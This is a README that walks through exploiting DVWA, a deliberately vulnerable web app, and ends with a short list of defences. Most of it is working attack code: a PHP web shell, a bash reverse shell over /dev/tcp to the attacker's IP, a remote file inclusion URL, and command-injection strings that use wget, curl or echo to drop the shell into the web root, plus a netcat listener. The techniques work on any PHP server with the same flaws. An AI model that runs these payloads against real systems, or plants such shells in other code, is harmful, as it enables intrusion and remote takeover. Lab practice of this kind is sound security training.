# DVWA Exploitation Project

This project demonstrates how to exploit various vulnerabilities in DVWA (Damn Vulnerable Web Application) to upload a PHP shell, gain remote access via a reverse shell, and execute commands on the target machine.

**DISCLAIMER: This project is for educational purposes only. Do not use these techniques on systems you do not own or have explicit permission to test.**

## Table of Contents
1. [Environment Setup](#environment-setup)
2. [Uploading a Shell via Remote File Inclusion (RFI)](#uploading-a-shell-via-remote-file-inclusion-rfi)
3. [Uploading a Shell via Command Injection](#uploading-a-shell-via-command-injection)
4. [Uploading a Shell Using the Echo Command](#uploading-a-shell-using-the-echo-command)
5. [Protection Against These Vulnerabilities](#protection-against-these-vulnerabilities)

## Environment Setup

Before starting, ensure you have the following tools and configuration:

- DVWA: Vulnerable host with adjustable security levels
- Kali Linux: Used to execute attacks from a virtual machine
- Netcat (nc): Tool for obtaining a remote connection
- PHP Shell: PHP script for executing commands, uploading, and deleting files on the target machine

## Uploading a Shell via Remote File Inclusion (RFI)

### Step 1: Prepare the PHP Shell

Create a simple PHP shell (`shell.php`) that allows remote execution of system commands:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Host this file on your own server (e.g., using a Python server):

```bash
python3 -m http.server 8000
```

### Step 2: Exploit the RFI Vulnerability

Use the following URL to inject the external file by exploiting the File Inclusion vulnerability in DVWA:

```
http://[DVWA_IP]/dvwa/vulnerabilities/fi/?page=http://[YOUR_IP]:8000/shell.php
```

### Step 3: Obtain a Reverse Shell with Netcat

Modify the `shell.php` file to open a connection to your machine:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/[YOUR_IP]/[PORT] 0>&1'");
?>
```

Set up a listener on your machine with Netcat:

```bash
nc -lnvp [PORT]
```

Navigate to the following URL in your browser to execute the shell:

```
http://[DVWA_IP]/dvwa/vulnerabilities/fi/?page=http://[YOUR_IP]:8000/shell.php
```

## Uploading a Shell via Command Injection

### Step 1: Exploit the Vulnerability

Use the command injection vulnerability in DVWA's IP input field for ping:

```bash
; wget http://[YOUR_IP]:8000/shell.php -O /var/www/html/shell.php
```

Or, if wget is not available:

```bash
; curl http://[YOUR_IP]:8000/shell.php -o /var/www/html/shell.php
```

### Step 2: Obtain a Shell via Netcat

Follow the same process as in the RFI method to set up a Netcat listener and connect to the uploaded shell.

## Uploading a Shell Using the Echo Command

If wget or curl are not available, use the echo command to write the shell code directly:

```php
; echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
```

Access the shell via:

```
http://[DVWA_IP]/shell.php?cmd=ls
```

## Protection Against These Vulnerabilities

### a) Protection against Remote File Inclusion (RFI)

- Disable `allow_url_include` in php.ini
- Validate and filter user inputs rigorously
- Use whitelisting for accessible files

### b) Protection against Command Injection

- Use secure functions like `escapeshellcmd()` or `escapeshellarg()` to escape special characters in commands
- Never directly accept user inputs for system commands
- Use server-side alternatives like APIs to perform tasks instead of directly executing commands

**Remember: Always practice ethical hacking and obtain proper authorization before testing security vulnerabilities.**


Author: github.com/dgthegeek